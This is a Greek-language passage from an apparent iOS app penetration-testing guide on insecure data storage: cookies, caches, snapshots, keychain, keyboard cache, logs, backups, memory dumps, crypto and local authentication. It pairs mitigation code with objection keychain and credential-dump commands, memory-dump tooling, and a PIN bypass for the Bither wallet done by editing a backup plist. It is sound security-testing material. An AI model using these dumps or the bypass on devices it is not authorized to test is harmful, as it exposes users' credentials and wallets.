Το [Couchbase Lite](https://github.com/couchbase/couchbase-lite-ios) περιγράφεται ως ένας **ελαφρύς** και **ενσωματωμένος** μηχανισμός βάσης δεδομένων που ακολουθεί την προσέγγιση των **εγγράφων** (NoSQL). Σχεδιασμένο να είναι φυσικό για το **iOS** και το **macOS**, προσφέρει τη δυνατότητα συγχρονισμού δεδομένων ανεμπόδιστα.

Για να εντοπιστούν πιθανές βάσεις δεδομένων του Couchbase σε μια συσκευή, πρέπει να ελεγχθεί το ακόλουθο φάκελο:
```bash
ls /private/var/mobile/Containers/Data/Application/{APPID}/Library/Application Support/
```
### Cookies

Το iOS αποθηκεύει τα cookies των εφαρμογών στο **`Library/Cookies/cookies.binarycookies`** μέσα στον φάκελο κάθε εφαρμογής. Ωστόσο, οι προγραμματιστές μερικές φορές αποφασίζουν να τα αποθηκεύσουν στο **keychain** καθώς το αναφερόμενο **αρχείο cookie μπορεί να προσπελαστεί στα αντίγραφα ασφαλείας**.

Για να επιθεωρήσετε το αρχείο cookies μπορείτε να χρησιμοποιήσετε [**αυτό το python script**](https://github.com/mdegrazia/Safari-Binary-Cookie-Parser) ή να χρησιμοποιήσετε την εντολή **`ios cookies get`** του objection.\
**Μπορείτε επίσης να χρησιμοποιήσετε το objection για** να μετατρέψετε αυτά τα αρχεία σε μορφή JSON και να επιθεωρήσετε τα δεδομένα.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios cookies get --json
[
{
"domain": "highaltitudehacks.com",
"expiresDate": "2051-09-15 07:46:43 +0000",
"isHTTPOnly": "false",
"isSecure": "false",
"name": "username",
"path": "/",
"value": "admin123",
"version": "0"
}
]
```
### Προσωρινή Αποθήκευση (Cache)

Από προεπιλογή, η NSURLSession αποθηκεύει δεδομένα, όπως **αιτήσεις και απαντήσεις HTTP, στη βάση δεδομένων Cache.db**. Αυτή η βάση δεδομένων μπορεί να περιέχει **ευαίσθητα δεδομένα**, εάν έχουν αποθηκευτεί διαπιστευτήρια, ονόματα χρηστών ή οποιεσδήποτε άλλες ευαίσθητες πληροφορίες. Για να βρείτε τις αποθηκευμένες πληροφορίες, ανοίξτε τον κατάλογο δεδομένων της εφαρμογής (`/var/mobile/Containers/Data/Application/<UUID>`) και πηγαίνετε στο `/Library/Caches/<Bundle Identifier>`. Η **προσωρινή αποθήκευση του WebKit αποθηκεύεται επίσης στο αρχείο Cache.db**. Το **Objection** μπορεί να ανοίξει και να αλληλεπιδράσει με τη βάση δεδομένων με την εντολή `sqlite connect Cache.db`, καθώς πρόκειται για μια **κανονική βάση δεδομένων SQLite**.

Συνιστάται να **απενεργοποιήσετε την προσωρινή αποθήκευση αυτών των δεδομένων**, καθώς μπορεί να περιέχουν ευαίσθητες πληροφορίες στην αίτηση ή την απόκριση. Η παρακάτω λίστα παρουσιάζει διάφορους τρόπους επίτευξης αυτού:

1. Συνιστάται να αφαιρέσετε τις αποθηκευμένες απαντήσεις μετά την αποσύνδεση. Αυτό μπορεί να γίνει με τη μέθοδο που παρέχεται από την Apple με το όνομα [`removeAllCachedResponses`](https://developer.apple.com/documentation/foundation/urlcache/1417802-removeallcachedresponses). Μπορείτε να καλέσετε αυτήν τη μέθοδο ως εξής:

`URLCache.shared.removeAllCachedResponses()`

Αυτή η μέθοδος θα αφαιρέσει όλες τις αποθηκευμένες αιτήσεις και απαντήσεις από το αρχείο Cache.db.
2. Εάν δεν χρειάζεστε να χρησιμοποιήσετε τα πλεονεκτήματα των cookies, θα ήταν συνιστώμενο να χρησιμοποιήσετε απλώς την ιδιότητα [.ephemeral](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral) της URLSession, η οποία θα απενεργοποιήσει την αποθήκευση cookies και προσωρινής αποθήκευσης.

[Τεκμηρίωση της Apple](https://developer.apple.com/documentation/foundation/urlsessionconfiguration/1410529-ephemeral):

`Ένα αντικείμενο διαμόρφωσης συνεδρίας επί προσωρινής βάσης είναι παρόμοιο με ένα προεπιλεγμένο αντικείμενο διαμόρφωσης συνεδρίας (δείτε το default), εκτός από το γεγονός ότι το αντίστοιχο αντικείμενο συνεδρίας δεν αποθηκεύει προσωρινές αποθηκεύσεις, αποθηκευτήρια διαπιστευτηρίων ή οποιαδήποτε συναφή δεδομένα συνεδρίας στον δίσκο. Αντ' αυτού, τα συναφή δεδομένα συνεδρίας αποθηκεύονται στη RAM. Το μόνο στιγμιότυπο που ένα αντικείμενο συνεδρίας επί προσωρινής βάσης γράφει στον δίσκο είναι όταν του ζητήσετε να γράψει το περιεχόμενο μιας URL σε ένα αρχείο.`
3. Η προσωρινή αποθήκευση μπορεί επίσης να απενεργοποιηθεί ορίζοντας την πολιτική αποθήκευσης σε [.notAllowed](https://developer.apple.com/documentation/foundation/urlcache/storagepolicy/notallowed). Αυτό θα απενεργοποιήσει την αποθήκευση προσωρινής αποθήκευσης οποιουδήποτε είδους, είτε στη μνήμη είτε στον δίσκο.

### Στιγμιότυπα (Snapshots)

Κάθε φορά που πατάτε το κουμπί αρχικής οθόνης, το iOS **καταγράφει ένα στιγμιότυπο της τρέχουσας οθόνης** για να μπορεί να γίνει ο μεταβατικός σχεδιασμός στην εφαρμογή με πιο ομαλό τρόπο. Ωστόσο, εάν υπάρχουν **ευαίσθητα δεδομένα** στην τρέχουσα οθόνη, θα αποθηκευτούν στην **εικόνα** (η οποία **διατηρείται** **ακόμα και μετά** **την επανεκκίνηση**). Αυτά είναι τα στιγμιότυπα στα οποία μπορείτε επίσης να έχετε πρόσβαση διπλά πατώντας την αρχική οθόνη για να αλλάξετε μεταξύ εφαρμογών.

Εκτός εάν το iPhone έχει κάνει jailbreak, ο **επιτιθέμενος** πρέπει να έχει **πρόσβαση** στη **μη ασφαλισμένη** συσκευή για να δει αυτές τις στιγμιότυπες οθόνης. Από προεπιλογή, το τελευταίο στιγμιότυπο αποθηκεύεται στο sandbox της εφαρμογής στον φάκελο `Library/Caches/Snapshots/` ή `Library/SplashBoard/Snapshots` (οι αξιόπιστοι υπολογιστές δεν μπορούν να έχουν πρόσβαση στο σύστημα αρχείων από το iOS 7.0).

Ένας τρόπος για να αποτρέψετε αυτήν την ανεπιθύμητη συμπεριφορά είναι να τοποθετήσετε μια κενή οθόνη ή να αφαιρέσετε τα ευαίσθητα δεδομένα πριν πάρετε το στιγμιότυπο χρησιμοποιώντας τη συνάρτηση `ApplicationDidEnterBackground()`.

Παρακάτω παρουσιάζεται ένα παράδειγμα μεθόδου αντιμετώπισης που θα ορίσει ένα προεπιλεγμένο στιγμιότυπο.

Swift:
```swift
private var backgroundImage: UIImageView?

func applicationDidEnterBackground(_ application: UIApplication) {
let myBanner = UIImageView(image: #imageLiteral(resourceName: "overlayImage"))
myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objective-C:

Η Objective-C είναι μια αντικειμενοστραφής γλώσσα προγραμματισμού που χρησιμοποιείται κυρίως για την ανάπτυξη εφαρμογών για το λειτουργικό σύστημα iOS. Είναι μια επέκταση της γλώσσας προγραμματισμού C και παρέχει πρόσθετες δυνατότητες για την αντικειμενοστραφή προγραμματισμό. Η Objective-C χρησιμοποιείται ευρέως για την ανάπτυξη εφαρμογών για iPhone, iPad και iPod Touch. Είναι μια ισχυρή γλώσσα που παρέχει πλούσια βιβλιοθήκη και εργαλεία για την ανάπτυξη εφαρμογών iOS.
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Αυτό ορίζει την εικόνα φόντου σε `overlayImage.png` όταν η εφαρμογή μεταβαίνει στο παρασκήνιο. Αποτρέπει τη διαρροή ευαίσθητων δεδομένων επειδή η `overlayImage.png` θα αντικαθιστά πάντα την τρέχουσα προβολή.

### Keychain

Για την πρόσβαση και διαχείριση του keychain του iOS, υπάρχουν εργαλεία όπως το [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper), κατάλληλα για συσκευές με jailbreak. Επιπλέον, το [**Objection**](https://github.com/sensepost/objection) παρέχει την εντολή `ios keychain dump` για παρόμοιους σκοπούς.

#### **Αποθήκευση διαπιστευτηρίων**

Η κλάση **NSURLCredential** είναι ιδανική για την αποθήκευση ευαίσθητων πληροφοριών απευθείας στο keychain, παρακάμπτοντας την ανάγκη για NSUserDefaults ή άλλα περιτυλίγματα. Για να αποθηκεύσετε διαπιστευτήρια μετά την είσοδο, χρησιμοποιείται ο παρακάτω κώδικας Swift:
```swift
NSURLCredential *credential;
credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Για να εξαγάγετε αυτές τις αποθηκευμένες πιστοποιητικές, χρησιμοποιείται η εντολή `ios nsurlcredentialstorage dump` του Objection.

## **Προσαρμοσμένα πληκτρολόγια και προσωρινή μνήμη πληκτρολογίου**

Από το iOS 8.0 και μετά, οι χρήστες μπορούν να εγκαταστήσουν προσαρμοσμένες επεκτάσεις πληκτρολογίου, οι οποίες διαχειρίζονται στο **Ρυθμίσεις > Γενικά > Πληκτρολόγιο > Πληκτρολόγια**. Αν και αυτά τα πληκτρολόγια προσφέρουν επιπλέον λειτουργίες, αποτελούν κίνδυνο για καταγραφή πληκτρολογίων και μετάδοση δεδομένων σε εξωτερικούς διακομιστές, αν και οι χρήστες ενημερώνονται για τα πληκτρολόγια που απαιτούν πρόσβαση στο δίκτυο. Οι εφαρμογές μπορούν, και θα έπρεπε, να περιορίσουν τη χρήση προσαρμοσμένων πληκτρολογίων για την εισαγωγή ευαίσθητων πληροφοριών.

**Συστάσεις ασφαλείας:**
- Συνιστάται να απενεργοποιήσετε τα πληκτρολόγια τρίτων για αυξημένη ασφάλεια.
- Να είστε επιφυλακτικοί ως προς τις λειτουργίες αυτόματης διόρθωσης και αυτόματων προτάσεων του προεπιλεγμένου πληκτρολογίου του iOS, το οποίο μπορεί να αποθηκεύει ευαίσθητες πληροφορίες σε αρχεία προσωρινής μνήμης που βρίσκονται στο `Library/Keyboard/{locale}-dynamic-text.dat` ή `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. Αυτά τα αρχεία προσωρινής μνήμης θα πρέπει να ελέγχονται τακτικά για ευαίσθητα δεδομένα. Συνιστάται η επαναφορά του λεξικού πληκτρολογίου μέσω των **Ρυθμίσεις > Γενικά > Επαναφορά > Επαναφορά Λεξικού Πληκτρολογίου** για την εκκαθάριση των προσωρινών δεδομένων.
- Η παρακολούθηση της κίνησης του δικτύου μπορεί να αποκαλύψει εάν ένα προσαρμοσμένο πληκτρολόγιο μεταδίδει απομακρυσμένα τα πλήκτρα που πατήθηκαν.

### **Αποτροπή Προσωρινής Αποθήκευσης Πεδίων Κειμένου**

Το πρωτόκολλο [UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) προσφέρει ιδιότητες για τη διαχείριση της αυτόματης διόρθωσης και της ασφαλούς εισαγωγής κειμένου, τις οποίες χρειάζονται για την αποτροπή της προσωρινής αποθήκευσης ευαίσθητων πληροφοριών. Για παράδειγμα, η απενεργοποίηση της αυτόματης διόρθωσης και η ενεργοποίηση της ασφαλούς εισαγωγής κειμένου μπορεί να επιτευχθεί με:
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
Επιπλέον, οι προγραμματιστές θα πρέπει να διασφαλίζουν ότι τα πεδία κειμένου, ιδιαίτερα αυτά που χρησιμοποιούνται για την εισαγωγή ευαίσθητων πληροφοριών όπως κωδικοί πρόσβασης και PIN, απενεργοποιούν την αποθήκευση προσωρινών δεδομένων θέτοντας την `autocorrectionType` σε `UITextAutocorrectionTypeNo` και την `secureTextEntry` σε `YES`.
```objectivec
UITextField *textField = [[UITextField alloc] initWithFrame:frame];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Αρχεία καταγραφής (Logs)**

Η αποσφαλμάτωση κώδικα συχνά περιλαμβάνει τη χρήση των **αρχείων καταγραφής (logs)**. Υπάρχει κίνδυνος, καθώς τα **αρχεία καταγραφής μπορεί να περιέχουν ευαίσθητες πληροφορίες**. Προηγουμένως, στο iOS 6 και σε προηγούμενες εκδόσεις, τα αρχεία καταγραφής ήταν προσβάσιμα από όλες τις εφαρμογές, δημιουργώντας κίνδυνο διαρροής ευαίσθητων δεδομένων. **Τώρα, οι εφαρμογές περιορίζονται στην πρόσβαση μόνο στα δικά τους αρχεία καταγραφής**.

Παρά τους περιορισμούς αυτούς, ένας **επιτιθέμενος με φυσική πρόσβαση** σε ένα ξεκλείδωτο συσκευή μπορεί ακόμα να εκμεταλλευτεί αυτό συνδέοντας τη συσκευή σε έναν υπολογιστή και **διαβάζοντας τα αρχεία καταγραφής**. Είναι σημαντικό να σημειωθεί ότι τα αρχεία καταγραφής παραμένουν στον δίσκο ακόμα και μετά την απεγκατάσταση της εφαρμογής.

Για να μειωθούν οι κίνδυνοι, συνίσταται να **αλληλεπιδράσετε εκτενώς με την εφαρμογή**, εξερευνώντας όλες τις λειτουργίες και τις εισόδους της για να διασφαλιστεί ότι δεν καταγράφονται ακούσια ευαίσθητες πληροφορίες.

Κατά την αναθεώρηση του πηγαίου κώδικα της εφαρμογής για πιθανές διαρροές, αναζητήστε τόσο **προκαθορισμένες** όσο και **προσαρμοσμένες δηλώσεις καταγραφής** χρησιμοποιώντας λέξεις-κλειδιά όπως `NSLog`, `NSAssert`, `NSCAssert`, `fprintf` για ενσωματωμένες συναρτήσεις και οποιαδήποτε αναφορά σε `Logging` ή `Logfile` για προσαρμοσμένες υλοποιήσεις.

### **Παρακολούθηση των αρχείων καταγραφής του συστήματος**

Οι εφαρμογές καταγράφουν διάφορα κομμάτια πληροφοριών που μπορεί να είναι ευαίσθητα. Για να παρακολουθήσετε αυτά τα αρχεία καταγραφής, χρησιμοποιήστε εργαλεία και εντολές όπως:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To capture the device logs
```
είναι χρήσιμες. Επιπλέον, το **Xcode** παρέχει έναν τρόπο για τη συλλογή καταγραφών κονσόλας:

1. Ανοίξτε το Xcode.
2. Συνδέστε τη συσκευή iOS.
3. Πλοηγηθείτε στο **Παράθυρο** -> **Συσκευές και Προσομοιωτές**.
4. Επιλέξτε τη συσκευή σας.
5. Προκαλέστε το πρόβλημα που ερευνάτε.
6. Χρησιμοποιήστε το κουμπί **Άνοιγμα Κονσόλας** για να προβάλετε τις καταγραφές σε ένα νέο παράθυρο.

Για πιο προηγμένη καταγραφή, η σύνδεση στο κέλυφος της συσκευής και η χρήση του **socat** μπορεί να παρέχει παρακολούθηση καταγραφών σε πραγματικό χρόνο:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock
```
Ακολουθούν εντολές για την παρακολούθηση των δραστηριοτήτων καταγραφής, οι οποίες μπορούν να είναι ανεκτίμητες για τη διάγνωση προβλημάτων ή την αναγνώριση πιθανής διαρροής δεδομένων στα αρχεία καταγραφής.

***

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Χρησιμοποιήστε το [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) για να δημιουργήσετε και να αυτοματοποιήσετε εργασιακές διαδικασίες με τη χρήση των πιο προηγμένων εργαλείων της κοινότητας.\
Αποκτήστε πρόσβαση σήμερα:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Αντίγραφα Ασφαλείας

Οι **λειτουργίες αυτόματης δημιουργίας αντιγράφων ασφαλείας** ενσωματώνονται στο iOS, διευκολύνοντας τη δημιουργία αντιγράφων των δεδομένων της συσκευής μέσω του iTunes (έως το macOS Catalina), του Finder (από το macOS Catalina και μετά) ή του iCloud. Αυτά τα αντίγραφα ασφαλείας περιλαμβάνουν σχεδόν όλα τα δεδομένα της συσκευής, εκτός από εξαιρετικά ευαίσθητα στοιχεία όπως οι λεπτομέρειες του Apple Pay και οι ρυθμίσεις του Touch ID.

### Κίνδυνοι Ασφάλειας

Η περιλαμβανόμενη **εγκατάσταση εφαρμογών και τα δεδομένα τους** στα αντίγραφα ασφαλείας θέτει το ζήτημα της πιθανής **διαρροής δεδομένων** και του κινδύνου ότι **οι τροποποιήσεις στα αντίγραφα ασφαλείας μπορεί να αλλοιώσουν τη λειτουργικότητα των εφαρμογών**. Συνιστάται να **μην αποθηκεύετε ευαίσθητες πληροφορίες σε απλό κείμενο** μέσα στον κατάλογο οποιασδήποτε εφαρμογής ή στους υποκαταλόγους της για να μειώσετε αυτούς τους κινδύνους.

### Αποκλεισμός Αρχείων από τα Αντίγραφα Ασφαλείας

Τα αρχεία στο `Documents/` και `Library/Application Support/` περιλαμβάνονται στα αντίγραφα ασφαλείας από προεπιλογή. Οι προγραμματιστές μπορούν να αποκλείσουν συγκεκριμένα αρχεία ή καταλόγους από τα αντίγραφα ασφαλείας χρησιμοποιώντας τη μέθοδο `NSURL setResourceValue:forKey:error:` με το `NSURLIsExcludedFromBackupKey`. Αυτή η πρακτική είναι ζωτικής σημασίας για την προστασία ευαίσθητων δεδομένων από την περιλαμβανόμενη σε αντίγραφα ασφαλείας.

### Δοκιμή για Ευπάθειες

Για να αξιολογήσετε την ασφάλεια των αντιγράφων ασφαλείας μιας εφαρμογής, ξεκινήστε με τη **δημιουργία ενός αντιγράφου ασφαλείας** χρησιμοποιώντας το Finder, και στη συνέχεια εντοπίστε το χρησιμοποιώντας τις οδηγίες από την [επίσημη τεκμηρίωση της Apple](https://support.apple.com/en-us/HT204215). Αναλύστε το αντίγραφο ασφαλείας για ευαίσθητα δεδομένα ή ρυθμίσεις που μπορεί να τροποποιηθούν για να επηρεάσουν τη συμπεριφορά της εφαρμογής.

Ευαίσθητες πληροφορίες μπορούν να αναζητηθούν χρησιμοποιώντας εργαλεία γραμμής εντολών ή εφαρμογές όπως το [iMazing](https://imazing.com). Για κρυπτογραφημένα αντίγραφα ασφαλείας, η παρουσία κρυπτογράφησης μπορεί να επιβεβαιωθεί ελέγχοντας το κλειδί "IsEncrypted" στο αρχείο "Manifest.plist" στη ρίζα του αντιγράφου ασφαλείας.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Για την αντιμετώπιση κρυπτογραφημένων αντιγράφων ασφαλείας, τα διαθέσιμα σενάρια Python στο [αποθετήριο GitHub της DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), όπως το **backup_tool.py** και το **backup_passwd.py**, μπορεί να είναι χρήσιμα, αν και πιθανώς απαιτούν προσαρμογές για συμβατότητα με τις πιο πρόσφατες εκδόσεις του iTunes/Finder. Ένας άλλος τρόπος για την πρόσβαση σε αρχεία εντός προστατευμένων με κωδικό πρόσβασης αντιγράφων ασφαλείας είναι το εργαλείο [**iOSbackup**](https://pypi.org/project/iOSbackup/).

### Τροποποίηση συμπεριφοράς εφαρμογής

Ένα παράδειγμα τροποποίησης της συμπεριφοράς μιας εφαρμογής μέσω τροποποιήσεων στο αντίγραφο ασφαλείας παρουσιάζεται στην εφαρμογή πορτοφολιού Bitcoin [Bither](https://github.com/bither/bither-ios), όπου ο κωδικός PIN κλειδώματος του UI αποθηκεύεται στο αρχείο `net.bither.plist` με το κλειδί **pin_code**. Η αφαίρεση αυτού του κλειδιού από το plist και η επαναφορά του αντιγράφου ασφαλείας καταργεί την απαίτηση του PIN, παρέχοντας απεριόριστη πρόσβαση.

## Σύνοψη για τον Έλεγχο Μνήμης για Ευαίσθητα Δεδομένα

Όταν ασχολείστε με ευαίσθητες πληροφορίες που αποθηκεύονται στη μνήμη μιας εφαρμογής, είναι κρίσιμο να περιορίσετε το χρόνο έκθεσης αυτών των δεδομένων. Υπάρχουν δύο κύριες προσεγγίσεις για την εξέταση του περιεχομένου της μνήμης: **δημιουργία εκχύλισματος μνήμης** και **ανάλυση της μνήμης σε πραγματικό χρόνο**. Και οι δύο μέθοδοι έχουν τις προκλήσεις τους, συμπεριλαμβανομένης της πιθανότητας να χαθούν κρίσιμα δεδομένα κατά τη διαδικασία εκχύλισης ή ανάλυσης.

## **Ανάκτηση και Ανάλυση Εκχύλισης Μνήμης**

Τόσο για συσκευές με jailbreak όσο και για συσκευές χωρίς jailbreak, εργαλεία όπως το [objection](https://github.com/sensepost/objection) και το [Fridump](https://github.com/Nightbringer21/fridump) επιτρέπουν το εκχύλισμα της μνήμης ενός διεργασίας εφαρμογής. Μετά το εκχύλισμα, η ανάλυση αυτών των δεδομένων απαιτεί διάφορα εργαλεία, ανάλογα με τη φύση των πληροφοριών που αναζητάτε.

Για την εξαγωγή συμβολοσειρών από ένα εκχύλισμα μνήμης, μπορούν να χρησιμοποιηθούν εντολές όπως `strings` ή `rabin2 -zz`:
```bash
# Extracting strings using strings command
$ strings memory > strings.txt

# Extracting strings using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Για πιο λεπτομερή ανάλυση, συμπεριλαμβανομένης της αναζήτησης για συγκεκριμένους τύπους δεδομένων ή προτύπων, το **radare2** προσφέρει εκτεταμένες δυνατότητες αναζήτησης:
```bash
$ r2 <name_of_your_dump_file>
[0x00000000]> /?
...
```
## **Ανάλυση Μνήμης Εκτέλεσης**

Το **r2frida** παρέχει μια ισχυρή εναλλακτική λύση για την επιθεώρηση της μνήμης μιας εφαρμογής σε πραγματικό χρόνο, χωρίς την ανάγκη για αντιγραφή μνήμης. Αυτό το εργαλείο επιτρέπει την εκτέλεση εντολών αναζήτησης απευθείας στη μνήμη της εκτελούμενης εφαρμογής:
```bash
$ r2 frida://usb//<name_of_your_app>
[0x00000000]> /\ <search_command>
```
## Κατεστραμμένη Κρυπτογραφία

### Ανεπαρκής Διαχείριση Κλειδιών

Ορισμένοι προγραμματιστές αποθηκεύουν ευαίσθητα δεδομένα στην τοπική αποθήκευση και τα κρυπτογραφούν με ένα κλειδί που έχει καθοριστεί/προβλέψιμο στον κώδικα. Αυτό δεν πρέπει να γίνεται, καθώς η ανάκτηση των εμπιστευτικών πληροφοριών μπορεί να επιτραπεί από επιτιθέμενους με αντίστροφη μηχανική.

### Χρήση Μη Ασφαλών και/ή Απαρχαιωμένων Αλγορίθμων

Οι προγραμματιστές δεν πρέπει να χρησιμοποιούν **απαρχαιωμένους αλγορίθμους** για να πραγματοποιούν **έλεγχους** εξουσιοδότησης, να **αποθηκεύουν** ή να **αποστέλλουν** δεδομένα. Ορισμένοι από αυτούς τους αλγορίθμους είναι: RC4, MD4, MD5, SHA1... Εάν χρησιμοποιούνται **κατακερματισμοί** για την αποθήκευση κωδικών πρόσβασης, για παράδειγμα, πρέπει να χρησιμοποιούνται ανθεκτικοί σε επίθεση με βία κατακερματισμοί με αλάτι.

### Έλεγχος

Οι κύριοι έλεγχοι που πρέπει να πραγματοποιηθούν είναι να βρεθούν **καθορισμένοι σκληροκωδικοποιημένοι** κωδικοί/μυστικά στον κώδικα, ή αν αυτοί είναι **προβλέψιμοι**, και αν ο κώδικας χρησιμοποιεί κάποιον είδος **αδύναμου** **κρυπτογραφικού** αλγορίθμου.

Είναι ενδιαφέρον να γνωρίζετε ότι μπορείτε να **παρακολουθείτε** ορισμένες **βιβλιοθήκες κρυπτογραφίας** αυτόματα χρησιμοποιώντας το **objection** με:
```swift
ios monitor crypt
```
Για **περισσότερες πληροφορίες** σχετικά με τις κρυπτογραφικές διεπαφές και βιβλιοθήκες του iOS, ανατρέξτε στο [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Τοπική Ταυτοποίηση

Η **τοπική ταυτοποίηση** παίζει έναν κρίσιμο ρόλο, ειδικά όταν πρόκειται για την προστασία της πρόσβασης σε απομακρυσμένο σημείο μέσω κρυπτογραφικών μεθόδων. Η ουσία εδώ είναι ότι χωρίς την κατάλληλη υλοποίηση, οι μηχανισμοί τοπικής ταυτοποίησης μπορούν να παρακαμφθούν.

Το **[πλαίσιο τοπικής ταυτοποίησης](https://developer.apple.com/documentation/localauthentication)** της Apple και το **[keychain](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)** παρέχουν αξιόπιστες διεπαφές προγραμματισμού για τους προγραμματιστές για τη διευκόλυνση των διαλόγων ταυτοποίησης του χρήστη και την ασφαλή διαχείριση μυστικών δεδομένων, αντίστοιχα. Το Secure Enclave ασφαλίζει το αναγνωριστικό δακτυλικού αποτυπώματος για το Touch ID, ενώ το Face ID βασίζεται στην αναγνώριση προσώπου χωρίς να θέτει σε κίνδυνο τα βιομετρικά δεδομένα.

Για να ενσωματώσουν το Touch ID/Face ID, οι προγραμματιστές έχουν δύο επιλογές API:
- **`LocalAuthentication.framework`** για την ταυτοποίηση του χρήστη σε υψηλό επίπεδο χωρίς πρόσβαση σε βιομετρικά δεδομένα.
- **`Security.framework`** για την πρόσβαση σε υπηρεσίες keychain σε χαμηλότερο επίπεδο, ασφαλίζοντας μυστικά δεδομένα με βιομετρική ταυτοποίηση. Διάφορα [περιτυλίγματα ανοιχτού κώδικα](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id) διευκολύνουν την πρόσβαση στο keychain.

{% hint style="danger" %}
Ωστόσο, τόσο το `LocalAuthentication.framework` όσο και το `Security.framework` παρουσιάζουν ευπάθειες, καθώς επιστρέφουν κυρίως λογικές τιμές χωρίς να μεταδίδουν δεδομένα για τις διαδικασίες ταυτοποίησης, καθιστώντας τα ευάλωτα στην παράκαμψη (ανατρέξτε στο [Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)).
{% endhint %}

### Εφαρμογή της Τοπικής Ταυτοποίησης

Για να ζητήσουν από τους χρήστες ταυτοποίηση, οι προγραμματιστές πρέπει να χρησιμοποιήσουν τη μέθοδο **`evaluatePolicy`** μέσα στην κλάση **`LAContext`**, επιλέγοντας ανάμεσα σε:
- **`deviceOwnerAuthentication`**: Ζητά το Touch ID ή τον κωδικό πρόσβασης της συσκευής, αποτυγχάνοντας εάν κανένα από τα δύο δεν είναι ενεργοποιημένο.
- **`deviceOwnerAuthenticationWithBiometrics`**: Ζητά αποκλειστικά το Touch ID.

Μια επιτυχημένη ταυτοποίηση υποδεικνύεται από μια λογική τιμή επιστροφής από τη μέθοδο **`evaluatePolicy`**, υποδεικνύοντας μια πιθανή αδυναμία ασφαλείας.

### Τοπική Ταυτοποίηση με το Keychain

Η εφαρμογή της **τοπικής ταυτοποίησης** σε εφαρμογές iOS περιλαμβάνει τη χρήση των **keychain APIs** για την ασφαλή αποθήκευση μυστικών δεδομένων, όπως τα αναγνωριστικά ταυτοποίησης. Αυτή η διαδικασία εξασφαλίζει ότι τα δεδομένα μπορούν να προσπελαστούν μόνο από τον χρήστη, χρησιμοποιώντας τον κωδικό πρόσβασης της συσκευής ή τη βιομετρική ταυτοποίηση, όπως το Touch ID.

Το keychain προσφέρει τη δυνατότητα να ορίσετε στοιχεία με το χαρακτηριστικό `SecAccessControl`, το οποίο περιορίζει την πρόσβαση στο στοιχείο μέχρι ο χρήστης να ταυτοποιηθεί με επιτυχία μέσω του Touch ID ή του κωδικού πρόσβασης της συσκευής. Αυτή η δυνατότητα είναι κρίσιμη για την ενίσχυση της ασφάλειας.

Παρακάτω παρουσιάζονται παραδείγματα κώδικα σε Swift και Objective-C που δείχνουν πώς να αποθηκεύσετε και να ανακτήσετε ένα αλφαριθμητικό από/προς το keychain, εκμεταλλευόμενοι αυτά τα χαρακτηριστικά ασφαλείας. Τα παραδείγματα δείχνουν ειδικά πώς να ρυθμίσετε τον έλεγχο πρόσβασης για να απαιτείται η ταυτοποίηση με το Touch ID και να εξασφαλίζεται ότι τα δεδομένα είναι προσπελάσιμα μόνο στη συσκευή στην οποία έχουν ρυθμιστεί, υπό την προϋπόθεση ότι έχει ρυθμιστεί ένας κωδικός πρόσβασης στη συσκευή.

{% tabs %}
{% tab title="Swift" %}
```swift
// From https://github.com/mufambisi/owasp-mstg/blob/master/Document/0x06f-Testing-Local-Authentication.md

// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Objective-C" %}

